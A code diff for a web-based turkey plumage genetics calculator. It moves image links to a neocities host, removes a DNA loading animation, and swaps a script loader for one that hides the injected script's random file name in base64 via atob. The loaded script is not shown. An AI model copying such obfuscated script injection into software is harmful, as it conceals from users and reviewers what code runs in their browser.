@@ -37,6 +37,9 @@ margin-top: 50px;
 /* Adjust margin-top as needed */
 }
 
+
+
+
 .horizontal-images-container {
 display: flex;
 justify-content: space-between;
@@ -272,64 +275,6 @@ text-decoration: none;
 background-color: #0b4bc9;
 }
 
-@keyframes rotate {
-        0% { transform: rotateX(0deg); }
-        100% { transform: rotateX(360deg); }
-    }
-
-    #loading-container {
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        text-align: center;
-        background-color: rgba(0, 0, 0, 0.9);
-        padding: 20px;
-        border-radius: 15px;
-        z-index: 9999;
-        width: 650px; /* Container width */
-        height: 200px; /* Slightly reduced height for a tighter look */
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        overflow: hidden;
-    }
-
-    .helix-wrapper {
-        position: relative;
-        width: 100%;
-        height: 110px; /* Adjusted height for perfect fit */
-        perspective: 800px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-    }
-
-    .dna-strand {
-        position: relative;
-        width: 100%;
-        height: 100%;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        transform-style: preserve-3d;
-        animation: rotate 3s linear infinite;
-    }
-
-    .cell {
-        position: absolute;
-        width: 16px; /* Visible and clear */
-        height: 16px;
-        border-radius: 50%;
-    }
-
-    #loading-text {
-        color: white;
-        font-weight: bold;
-        margin-top: 12px;
-    }
-    
 <a name="top"></a>
 <!-- rest of your page content -->
 </style>
@@ -339,9 +284,9 @@ background-color: #0b4bc9;
 <meta name="viewport" content="width=device-width, initial-scale=.75">
 
 <div class="header-container">
-<img src="https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/Tails.jpg" alt="Left Image" class="logo" style="width: 150px; height: auto;">
+<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Left Image" class="logo" style="width: 150px; height: auto;">
 <h1>Porter's Turkey Color Calculator</h1>
-<img src="https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
+<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
 </div>
 
 
@@ -510,15 +455,6 @@ background-color: #0b4bc9;
     <p id="ackMessage"></p>
 </div>
 
-
-<div id="loading-container">
-    <div class="helix-wrapper">
-        <div class="dna-strand" id="dnaStrand"></div>
-    </div>
-    <p id="loading-text">Loading genetic data...</p>
-</div>
-
-
 <script>
 function clearSummaryChart() {
 const summaryTableBody = document.getElementById('summaryChart').querySelector('tbody');
@@ -649,9 +585,6 @@ combinationsSl.ratios[outcomeSl];
 console.log(phenotype1);
 console.log(phenotype1A);
 console.log(phenotype1B);
-console.log(phenotype1C);
-console.log(phenotype1D);
-console.log(phenotype1E);        
 console.log(phenotype2);
 console.log(phenotype2A);
 console.log(phenotype3);
@@ -690,7 +623,7 @@ if (!phenotype && genotype.includes("cc")) {
 }
 
 
-const basePicturePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/';
+const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
 
 const maleGenotype = {
 genotype,
@@ -738,16 +671,11 @@ displayResults('femaleOffspringResults', femaleOffspring, 'female');
 displaySummaryChart(maleOffspring, femaleOffspring);
 }
 
-  // Load allele combinations
-(function() { 
+(function() {
     var sysLoader = document.createElement('script');
-    sysLoader.src = "https://portersturkeys.github.io/adv-cal/akzzfjhfys4493.js";
+    sysLoader.src = atob("a2xka2dlZTgzNzUuanM="); 
     document.head.appendChild(sysLoader);
-})();      
-
-
-
-
+})();
 
 function calculateCombinations(alleleSire, alleleDam, locus) {
 const alleles = [alleleSire, alleleDam].sort().join(' ');
@@ -1561,8 +1489,8 @@ ratios
 }
 
 function setDefaultImages() {
-const defaultMalePath = 'Pictures/';
-const defaultFemalePath = 'Pictures/';
+const defaultMalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+const defaultFemalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
 
 document.getElementById('sireImageContainer').innerHTML = `<img src="${defaultMalePath}" alt="Default Sire Image" style="max-width: 300px; height: auto;">`;
 document.getElementById('damImageContainer').innerHTML = `<img src="${defaultFemalePath}" alt="Default Dam Image" style="max-width: 300px; height: auto;">`;
@@ -1593,7 +1521,7 @@ function displayResults(containerId, offspring, sex) {
 
         const genotype = removeUnusedAlleles(offspringItem.genotype);
         const phenotype = offspringItem.phenotype || 'To be defined';
-        const basePicturePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/';
+        const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
         const adultPicturePath = basePicturePath + (sex === 'male' ? 'M' : 'F') + phenotype.replace(/\s/g, '') + '.jpg';
 
         // Default poult image
@@ -1613,7 +1541,7 @@ if (genotype.includes('cc') && !genotype.includes("Fdfd") && !genotype.includes(
             }
         }
 
-        const fallbackImagePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/image-not-available.jpg'; // Replace with your actual fallback image URL
+        const fallbackImagePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/image-not-available.jpg'; // Replace with your actual fallback image URL
 
         // Format the ratio to display with accurate precision
         const ratio = (offspringItem.ratio * 100).toFixed(7).replace(/\.?0+$/, '');
@@ -1644,8 +1572,8 @@ if (genotype.includes('cc') && !genotype.includes("Fdfd") && !genotype.includes(
 
 
 function setGenotypeImage(containerId, alleleb, alleleC, alleled, alleleE, alleleN, allelePn, alleleR, alleleSl, sex) {
-    const basePicturePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/';
-    const fallbackImagePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/image-not-available.jpg'; // Replace with your fallback image URL
+    const basePicturePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/';
+    const fallbackImagePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/image-not-available.jpg'; // Replace with your fallback image URL
     const sexPrefix = sex === 'male' ? 'M' : 'F';
 
     // Build genotype string
@@ -1701,8 +1629,8 @@ if (genotype.includes('cc') && !(genotype.includes('Fdfd') || genotype.includes(
 
 // Update the setDefaultImages function
 function setDefaultImages() {
-const defaultMalePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/MBronze.jpg';
-const defaultFemalePath = 'https://raw.githubusercontent.com/PortersTurkeys/Pictures/refs/heads/main/FBronze.jpg';
+const defaultMalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/MBronze.jpg';
+const defaultFemalePath = 'https://porters-rare-heritage-turkeys.neocities.org/Pictures/FBronze.jpg';
 
 document.getElementById('sireImageContainer').innerHTML = `<img src="${defaultMalePath}" alt="Default Sire Image" style="max-width: 460px; height: auto;">`;
 document.getElementById('damImageContainer').innerHTML = `<img src="${defaultFemalePath}" alt="Default Dam Image" style="max-width: 460px; height: auto;">`;
@@ -1966,43 +1894,7 @@ function showPopup(message) {
     }, 2000);
 }
 
-document.addEventListener("DOMContentLoaded", function() {
-    const dnaStrand = document.getElementById("dnaStrand");
-    const numPairs = 14; // Number of base pairs
-    const radius = 45; // Reduced slightly to fit the new height
-    const widthStep = 620 / (numPairs - 1); // Ensures full width extension
-    const twistFactor = 1.2; // Controls the twisting effect
 
-    // Array of 12 colors including white and teal
-    const colors = ["red", "blue", "green", "yellow", "orange", "purple", "cyan", "magenta", "lime", "pink", "white", "teal"];
-
-    for (let i = 0; i < numPairs; i++) {
-        let angle = (i / numPairs) * Math.PI * 2 * twistFactor; // Angle for each pair
-        let colorIndex = i % colors.length; // Cycle through colors
-
-        // Create left and right DNA dots
-        let leftDot = document.createElement("div");
-        let rightDot = document.createElement("div");
-        leftDot.classList.add("cell");
-        rightDot.classList.add("cell");
-
-        // Assign colors from the array
-        leftDot.style.backgroundColor = colors[colorIndex];
-        rightDot.style.backgroundColor = colors[(colorIndex + 1) % colors.length]; // Offset colors
-
-        // Perfectly position dots for full visibility
-        leftDot.style.transform = `translate3d(${(i * widthStep) - 310}px, ${Math.cos(angle) * radius}px, ${Math.sin(angle) * radius}px)`;
-        rightDot.style.transform = `translate3d(${(i * widthStep) - 310}px, ${Math.cos(angle + Math.PI) * radius}px, ${Math.sin(angle + Math.PI) * radius}px)`;
-
-        dnaStrand.appendChild(leftDot);
-        dnaStrand.appendChild(rightDot);
-    }
-
-    // Remove loading screen after 5 seconds
-    setTimeout(() => {
-        document.getElementById("loading-container").style.display = "none";
-    }, 1000);
-});
 
 </script>
 
